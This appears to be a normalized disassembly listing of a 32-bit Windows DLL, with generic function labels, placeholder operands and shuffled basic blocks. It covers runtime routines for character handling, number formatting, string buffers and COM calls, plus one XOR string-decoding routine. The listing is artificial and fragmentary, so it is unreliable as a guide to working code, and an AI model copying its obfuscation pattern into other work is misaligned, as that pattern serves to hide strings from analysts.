mov ecx [ ebp - 0x2c ]
push ebx
push ecx
push eax
mov [ esi + 0xc ] eax
call sub_1007f5d0
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0xc ] edi
mov ebx [ ebp - 0x2c ]
cmp ebx edi
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x67
call sub_10053240
push eax
call sub_10035937
add esp 0x4
mov [ esi + 0x10 ] eax
jmp r-xdata
push ebx
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea edx [ ebx + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x30 ]
push ebx
push ecx
push eax
mov [ esi + 0x1c ] eax
call sub_1007f5d0
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x1c ] edi
mov ebx [ ebp - 0x30 ]
cmp ebx edi
je r-xdata
mov eax [ ebp - 0x3c ]
cmp eax edi
pop edi
pop ebx
je r-xdata
push eax
call sub_10035937
add esp 0x4
mov [ esi + 0x14 ] eax
mov eax [ ebp - 0x40 ]
cmp eax edi
je r-xdata
mov eax [ ebp - 0x44 ]
cmp eax edi
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax esi
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x14
push eax
call sub_10035937
add esp 0x4
mov [ esi + 0x18 ] eax
sub_1003eba7
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_100592ca
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x80
pop ebp
retn
sub_1003ebe0
push ebp
mov ebp esp
and esp 0xffffffc0
sub esp 0xb4
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xb0 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
mov [ esp + 0x38 ] eax
mov eax [ ebx + 0x1c ]
xor edi edi
mov [ esp + 0x3c ] ecx
mov ecx [ ebx + 0x18 ]
cmp eax edi
jg r-xdata
mov esi ecx
jl r-xdata
mov [ esp + 0x34 ] esi
jg r-xdata
test [ ebx + 0x14 ] 0x2000
jne r-xdata
cmp ecx edi
ja r-xdata
fld [ ebp + 0x1c ]
fldz
fld [ ebp + 0x1c ]
fcom st1
fnstsw ax
test ah 0x5
jpe r-xdata
mov [ esp + 0x34 ] 0x24
jmp r-xdata
cmp esi 0x24
jbe r-xdata
mov esi 0x6
xor eax eax
jmp r-xdata
test dl 0x10
je r-xdata
mov [ esp + 0x41 ] 0x2b
lea eax [ esp + 0x42 ]
mov [ esp + 0x2f ] 0x0
jmp r-xdata
mov [ esp + 0x2f ] 0x1
fchs
mov eax [ esp + 0x34 ]
cdq
sub esi eax
sbb ecx edx
mov edx [ ebx + 0x14 ]
mov eax edx
and eax 0x3000
mov [ esp + 0x30 ] edi
cmp eax 0x2000
jne r-xdata
mov ecx eax
cmp ecx edi
jl r-xdata
and edx 0x3000
mov [ eax ] 0x2a2e
mov [ eax + 0x2 ] 0x4c
cmp edx 0x2000
jne r-xdata
mov [ eax ] 0x23
inc eax
fld [ r--data ]
fcom st1
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
cmp [ esp + 0x30 ] 0x1388
jae r-xdata
fstp st1
jmp r-xdata
cmp edx 0x3000
jne r-xdata
mov cl 0x66
jmp r-xdata
fdiv st2
add [ esp + 0x30 ] 0xa
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
cmp edx 0x1000
setne cl
lea ecx [ ecx + ecx + 0x65 ]
mov cl 0x61
jmp r-xdata
sub esp 0x8
mov [ eax + 0x3 ] cl
fstp [ esp ]
mov ecx [ esp + 0x3c ]
push ecx
lea edx [ esp + 0x4c ]
push edx
mov [ eax + 0x4 ] 0x0
lea eax [ esp + 0x58 ]
push 0x6c
push eax
call sub_1005c1c5
mov ecx [ esp + 0x48 ]
push eax
mov eax [ ebp + 0x18 ]
push esi
mov esi [ esp + 0x58 ]
push edi
push ecx
mov ecx [ ebp + 0x10 ]
lea edx [ esp + 0x70 ]
push edx
mov edx [ ebp + 0xc ]
push eax
mov eax [ esp + 0x6c ]
push ebx
push ecx
push edx
push esi
push eax
call sub_1004fe90
mov ecx [ esp + 0x100 ]
add esp 0x44
pop edi
mov eax esi
pop esi
pop ebx
xor ecx esp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x1c
fxch st1
fstp st0
cmp [ esp + 0x2f ] 0x0
fstp st1
je r-xdata
test ecx ecx
jl r-xdata
mov [ esp + 0x40 ] 0x25
lea eax [ esp + 0x41 ]
test dl 0x20
je r-xdata
fchs
jmp r-xdata
jg r-xdata
fld [ r--data ]
jmp r-xdata
cmp esi 0xa
jb r-xdata
fcom st1
fnstsw ax
test ah 0x1
jne r-xdata
fstp st0
jmp r-xdata
cmp edi 0x1388
jae r-xdata
add esi 0xfffffff6
fxch st1
adc ecx 0xffffffff
fmul st2
add edi 0xa
test ecx ecx
jg r-xdata
fxch st1
jl r-xdata
fstp st1
cmp esi 0xa
jae r-xdata
sub_1003edde
push 0x80
mov eax sub_1008561a
call sub_1003fae8
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x18 ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x70 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x8c ] eax
lea eax [ ebp - 0x88 ]
push eax
mov [ ebp - 0x74 ] edi
call sub_10013950
xor ebx ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_10071f2c
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x88 ]
mov [ ebp - 0x78 ] eax
call sub_10034a80
mov ecx [ ebp - 0x78 ]
lea eax [ ebp - 0x48 ]
push eax
call sub_1000ff3d
add edi 0x8
push edi
push ebx
push 0x30
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x6c ] edi
call sub_1004a330
push edi
movzx eax ax
push ebx
push 0x61
mov [ ebp - 0x60 ] eax
call sub_1004a330
push edi
movzx eax ax
push ebx
push 0x41
mov [ ebp - 0x80 ] eax
call sub_1004a330
movzx eax ax
add esp 0x24
push [ ebp - 0x5c ]
mov [ ebp - 0x7c ] eax
mov eax [ ebp - 0x70 ]
mov ecx esi
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x51 ] bl
call sub_10069d0f
test al al
jne r-xdata
mov eax [ ebp - 0x50 ]
push [ ebp - 0x5c ]
mov [ eax ] 0x7830
add eax 0x2
mov ecx esi
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x49 ] bl
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x68 ] ebx
call sub_10069d0f
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x2b
call sub_1004a330
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001c121
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
movzx eax [ esi + 0x6 ]
cmp ax [ ebp - 0x60 ]
jne r-xdata
mov ecx esi
call sub_1001c121
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x70 ]
mov [ eax ] 0x2b
jmp r-xdata
push [ ebp - 0x5c ]
mov ecx esi
call sub_10069d0f
test al al
je r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
mov ecx esi
call sub_1005a5dc
push [ ebp - 0x5c ]
mov ecx esi
call sub_10069d0f
test al al
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x2d
call sub_1004a330
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001c121
inc eax
mov ecx esi
mov [ ebp - 0x50 ] eax
call sub_1005a5dc
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ ebp - 0x49 ] bl
je r-xdata
cmp [ eax ] bl
jle r-xdata
lea eax [ ebp - 0x48 ]
mov [ ebp - 0x49 ] 0x1
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x70 ]
mov [ eax ] 0x2d
push [ ebp - 0x7c ]
movzx eax [ esi + 0x6 ]
push [ ebp - 0x80 ]
push [ ebp - 0x60 ]
push eax
push [ ebp - 0x74 ]
call sub_1005393c
mov edi eax
add esp 0x14
cmp edi ebx
jl r-xdata
mov ecx esi
call sub_1001c121
push [ ebp - 0x5c ]
mov ecx esi
call sub_10069d0f
test al al
jne r-xdata
cmp [ ebp - 0x58 ] ebx
jne r-xdata
cmp [ ebp - 0x38 ] ebx
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x78
call sub_1004a330
add esp 0xc
cmp di ax
je r-xdata
mov ecx esi
call sub_1001c121
cmp [ ebp - 0x58 ] 0x24
jl r-xdata
cmp [ ebp - 0x58 ] ebx
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
mov ecx [ ebp - 0x78 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
movzx eax ax
mov [ ebp - 0x84 ] eax
mov [ ebp - 0x84 ] ebx
jmp r-xdata
mov ecx esi
call sub_1005a5dc
jmp r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
inc [ ebp - 0x68 ]
jmp r-xdata
push [ ebp - 0x5c ]
mov ecx esi
call sub_10069d0f
test al al
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x78 ]
mov eax [ ecx ]
movzx edi [ esi + 0x6 ]
call [ eax + 0x4 ]
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001c121
cmp [ ebp - 0x34 ] 0x10
mov edx [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
call sub_100405c0
push [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x64 ] ebx
call sub_10069d0f
test al al
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x58
call sub_1004a330
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001c121
mov ax [ ebp - 0x60 ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_1001c121
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005a5dc
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ ebp - 0x49 ] bl
je r-xdata
push [ ebp - 0x5c ]
mov ecx esi
call sub_10069d0f
test al al
je r-xdata
call sub_1002f11b
mov eax [ eax ]
mov ecx [ ebp - 0x50 ]
mov al [ eax ]
inc [ ebp - 0x50 ]
mov [ ecx ] al
mov ecx esi
call sub_1005a5dc
cmp [ ebp - 0x51 ] bl
jne r-xdata
lea edx [ ebp - 0x48 ]
push [ ebp - 0x7c ]
movzx eax [ esi + 0x6 ]
push [ ebp - 0x80 ]
push [ ebp - 0x60 ]
push eax
push [ ebp - 0x74 ]
call sub_1005393c
mov edi eax
add esp 0x14
cmp edi ebx
jl r-xdata
mov ecx esi
call sub_1001c121
mov ecx [ ebp - 0x50 ]
mov al [ edi + r--data ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x58 ]
mov [ ecx ] al
cmp [ ebp - 0x58 ] ebx
je r-xdata
push [ ebp - 0x7c ]
movzx eax [ esi + 0x6 ]
push [ ebp - 0x80 ]
push [ ebp - 0x60 ]
push eax
push [ ebp - 0x74 ]
call sub_1005393c
add esp 0x14
cmp eax ebx
jl r-xdata
mov ecx esi
call sub_1001c121
cmp [ ebp - 0x51 ] bl
jne r-xdata
push [ ebp - 0x5c ]
mov ecx esi
call sub_10069d0f
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ ebp - 0x68 ] ebx
jge r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_1002c8c0
jmp r-xdata
mov edi [ ebp - 0x64 ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x58 ] 0x24
mov [ ebp - 0x49 ] 0x1
jl r-xdata
cmp [ ebp - 0x58 ] 0x24
jge r-xdata
mov eax [ ebp - 0x70 ]
jmp r-xdata
cmp [ ebp - 0x49 ] bl
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
mov ax [ ebp - 0x60 ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_1001c121
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x68 ]
mov [ eax ] 0x30
jmp r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
mov ecx [ ebp - 0x64 ]
cmp [ eax + ecx ] bl
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x4 ] bl
jne r-xdata
inc [ ebp - 0x68 ]
jmp r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005a5dc
mov ecx [ ebp - 0x50 ]
mov al [ eax + r--data ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x58 ]
mov [ ecx ] al
mov ecx [ ebp - 0x8c ]
mov [ eax ] bl
mov eax [ ebp - 0x68 ]
push ebx
mov [ ecx ] eax
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_1002c8c0
xor eax eax
call sub_1004642f
retn
mov eax [ ebp - 0x50 ]
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x70
call sub_1004a330
add esp 0xc
cmp di ax
je r-xdata
mov ecx esi
call sub_1001c121
dec [ ebp - 0x68 ]
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005a5dc
dec edi
je r-xdata
cmp [ ebp - 0x64 ] ebx
je r-xdata
cmp [ ebp - 0x84 ] bx
je r-xdata
movzx eax [ esi + 0x6 ]
cmp ax [ ebp - 0x60 ]
jne r-xdata
mov ecx esi
call sub_1001c121
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov ecx esi
mov [ eax ] 0x70
call sub_1005a5dc
push [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x49 ] bl
mov [ ebp - 0x58 ] ebx
call sub_10069d0f
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp edi ebx
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
mov ecx [ ebp - 0x50 ]
mov al [ edi + r--data ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x58 ]
mov [ ecx ] al
cmp [ ebp - 0x58 ] ebx
je r-xdata
mov ecx [ ebp - 0x64 ]
cmp [ eax + ecx ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
mov edi [ ebp - 0x5c ]
push edi
mov ecx esi
call sub_10069d0f
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x50
call sub_1004a330
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001c121
cmp [ edx + 0x1 ] bl
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + edi ]
jne r-xdata
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x64 ]
cmp [ eax + ecx ] bl
jle r-xdata
lea eax [ ebp - 0x2c ]
movzx eax [ esi + 0x6 ]
cmp ax [ ebp - 0x84 ]
jne r-xdata
mov ecx esi
call sub_1001c121
mov ecx esi
call sub_1005a5dc
push [ ebp - 0x5c ]
mov ecx esi
call sub_10069d0f
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
push edi
mov ecx esi
call sub_10069d0f
test al al
je r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x2b
call sub_1004a330
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001c121
cmp edi ebx
jbe r-xdata
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x51 ] 0x1
mov [ ebp - 0x51 ] 0x1
inc [ ebp - 0x64 ]
jmp r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1004ca10
inc [ ebp - 0x64 ]
mov ecx [ ebp - 0x64 ]
inc [ eax + ecx ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x4 ] bl
jne r-xdata
mov ax [ ebp - 0x60 ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_1001c121
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2b
jmp r-xdata
mov ax [ ebp - 0x60 ]
cmp ax [ esi + 0x6 ]
ja r-xdata
mov ecx esi
call sub_1001c121
cmp [ ebp - 0x49 ] bl
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005a5dc
push edi
mov ecx esi
call sub_10069d0f
test al al
je r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x2d
call sub_1004a330
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001c121
inc [ ebp - 0x50 ]
mov ecx esi
call sub_1005a5dc
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
jmp r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2d
movzx eax [ ebp - 0x60 ]
movzx ecx [ esi + 0x6 ]
add eax 0x9
cmp ecx eax
jg r-xdata
mov ecx esi
call sub_1001c121
cmp [ ebp - 0x58 ] 0x8
jge r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005a5dc
cmp [ esi + 0x4 ] bl
jne r-xdata
mov al [ esi + 0x6 ]
sub al [ ebp - 0x60 ]
mov ecx [ ebp - 0x50 ]
add al 0x30
inc [ ebp - 0x50 ]
inc [ ebp - 0x58 ]
mov [ ecx ] al
mov ecx esi
call sub_1001c121
sub_1003f500
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
sub esp 0x8
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
push edi
mov edi ecx
jne r-xdata
cmp edi [ esi + 0x4 ]
je r-xdata
mov ecx [ edx ]
lea ecx [ ecx ]
mov ecx [ edx ]
lea edx [ ebp - 0x8 ]
mov [ ebp - 0x8 ] ecx
push edx
mov ecx esi
mov [ ebp - 0x4 ] 0x0
call sub_10061460
push eax
push edi
lea eax [ ebp + 0x8 ]
push eax
mov ecx esi
call sub_1002af00
mov eax [ ebp + 0x8 ]
pop edi
add eax 0x10
pop esi
mov esp ebp
pop ebp
retn 0x4
mov eax [ edx ]
cmp eax [ edi + 0xc ]
jae r-xdata
mov edi eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
jmp r-xdata
lea eax [ edi + 0x10 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
cmp [ eax + 0xc ] ecx
jae r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
sub_1003f57a
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_10038a17
pop ecx
pop ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
pop ebp
retn
add eax 0x20
pop ebp
retn
sub_1003f5a6
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1001da0a
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x2
lea eax [ ebp - 0x10 ]
push eax
push 0x2
push [ ebp + 0x8 ]
call sub_100079d1
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_1003f5f7
push 0x10
mov eax sub_10085177
call sub_10013486
mov esi ecx
mov [ ebp - 0x18 ] esi
call sub_1002f11b
xor ebx ebx
mov edi eax
mov [ esi + 0x8 ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov [ ebp - 0x4 ] ebx
cmp [ ebp + 0xc ] bl
je r-xdata
mov eax [ edi + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] r--data
jmp r-xdata
call sub_10013ab8
retn 0x8
call sub_10059d69
mov [ esi + 0xc ] 0x2e
call sub_10059d69
mov [ esi + 0xd ] 0x2c
call sub_10059d69
lea eax [ ebp - 0x1c ]
push eax
push ebx
push [ ebp - 0x14 ]
call sub_10007a90
add esp 0xc
mov [ esi + 0x8 ] eax
call sub_10059d69
lea eax [ ebp - 0x1c ]
push eax
push ebx
push r--data
call sub_10007a90
add esp 0xc
mov [ esi + 0x10 ] eax
call sub_10059d69
lea eax [ ebp - 0x1c ]
push eax
push ebx
push r--data
call sub_10007a90
add esp 0xc
mov [ esi + 0x14 ] eax
call sub_10059d69
mov eax [ edi ]
mov al [ eax ]
mov [ esi + 0xc ] al
call sub_10059d69
mov eax [ edi + 0x4 ]
mov al [ eax ]
mov [ esi + 0xd ] al
cmp [ ebp + 0xc ] bl
je r-xdata
sub_1003f6c7
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_10013143
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_10067d3a
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
test eax eax
je r-xdata
push esi
call sub_10035d06
pop ecx
xor esi esi
push 0x0
push esi
call sub_1002be1e
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_1003f740
push 0x3c
mov eax sub_10085776
call sub_1003fae8
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10013950
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_1006f961
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_1000bb8f
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
mov [ ebp - 0x44 ] edx
call sub_10034a80
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004642f
retn 0x20
sub_1003f800
push ebp
mov ebp esp
push 0xffffffff
push sub_100865b0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov [ ebp - 0x14 ] edi
mov eax [ ebp + 0x8 ]
mov esi eax
or esi 0xf
cmp esi 0xfffffffe
jbe r-xdata
mov ebx [ edi + 0x14 ]
mov eax 0xaaaaaaab
mul esi
mov ecx ebx
shr ecx 0x1
shr edx 0x1
cmp ecx edx
jbe r-xdata
mov esi eax
jmp r-xdata
xor eax eax
lea ecx [ esi + 0x1 ]
mov [ ebp - 0x4 ] eax
cmp ecx eax
jbe r-xdata
mov eax 0xfffffffe
sub eax ecx
lea esi [ ecx + ebx ]
cmp ebx eax
jbe r-xdata
mov [ ebp + 0x8 ] eax
jmp r-xdata
cmp ecx 0xffffffff
ja r-xdata
mov esi 0xfffffffe
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
lea ecx [ ebp - 0x18 ]
push ecx
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x18 ] 0x0
call sub_10069ac6
push r--data
lea edx [ ebp - 0x28 ]
push edx
mov [ ebp - 0x28 ] r--data
call sub_10024fe9
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
inc eax
mov [ ebp - 0x10 ] esp
push eax
add ecx 0x18
mov [ ebp - 0x4 ] 0x2
call sub_100019c0
mov [ ebp + 0x8 ] eax
mov eax r-xdata
retn
push ecx
call sub_1001f84c
add esp 0x4
test eax eax
je r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov eax [ ebp + 0x8 ]
mov [ edi ] 0x0
mov [ edi ] eax
mov [ edi + 0x14 ] esi
mov [ edi + 0x10 ] ebx
cmp esi 0x10
jb r-xdata
mov ecx [ edi ]
push ecx
call sub_100187af
add esp 0x4
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov [ edi + ebx ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edi eax
push ebx
push eax
mov eax [ ebp + 0x8 ]
push eax
call sub_1007f5d0
add esp 0xc
sub_1003f93b
mov esi [ ebp - 0x14 ]
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push 0x0
mov [ esi ] 0x0
call sub_10024fe9
int3
mov edx [ esi ]
push edx
call sub_100187af
add esp 0x4
sub_1003f970
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
mov edi ecx
mov ecx [ r--data ]
mov [ ebp - 0x24 ] 0x0
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffa5
and edx 0xff
mov [ ebp + eax * 2 - 0x20 ] dx
inc eax
cmp eax 0xd
jb r-xdata
xor eax eax
lea edx [ ebp - 0x24 ]
push edx
mov [ ebp - 0x6 ] ax
mov eax [ edi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x20 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ ebp - 0x24 ]
mov ecx [ eax ]
push esi
lea edx [ ebp - 0x28 ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
mov edx [ ebp - 0x28 ]
mov eax edx
lea esi [ eax + 0x2 ]
jmp r-xdata
mov eax 0x1
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax esi
sar eax 0x1
push eax
lea esi [ edi + 0x40 ]
push edx
mov ecx esi
call sub_1005ddc0
mov ecx [ ebp - 0x28 ]
push ecx
call [ SysFreeString@IAT ]
mov eax [ ebp - 0x24 ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov eax [ esi + 0x10 ]
push r--data
xor edi edi
mov ecx esi
mov [ ebp - 0x24 ] 0x0
call sub_1001a2f0
mov ecx [ ebp - 0x4 ]
neg eax
sbb eax eax
and eax 0xfffffffe
pop esi
xor ecx ebp
add eax 0x2
pop edi
call sub_10001e8b
mov esp ebp
pop ebp
retn
